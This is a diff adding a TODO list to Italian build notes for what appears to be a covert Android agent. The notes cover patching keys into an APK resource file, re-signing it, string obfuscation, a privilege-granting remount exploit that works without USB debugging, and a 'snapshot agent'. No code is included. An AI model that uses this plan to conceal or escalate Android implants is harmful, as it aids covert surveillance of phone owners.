@@ -16,3 +16,22 @@ Procedura di binary patch.
 - le chiavi vanno binary patchate nel file res/raw/resources.bin
 - il tutto deve venire rizippato con nome android_service-patched.apk
 - il file suddetto deve venire firmato con la procedura signApk.bat
+
+
+TODO
+
+RCS_ -> ????
+Scrambling delle stringhe : 
+	1) manuale, con script ruby di scramble, in java unscramble
+	2) automatico con preprocessore
+	3) externalize strings
+Exploit: 
+	1) remount
+	2) split su diverse parti
+	3) funziona senza usb debugging
+	4) grant dei privilegi
+	5) vedere su quali telefoni va....
+Snapshot agent
+
+
+
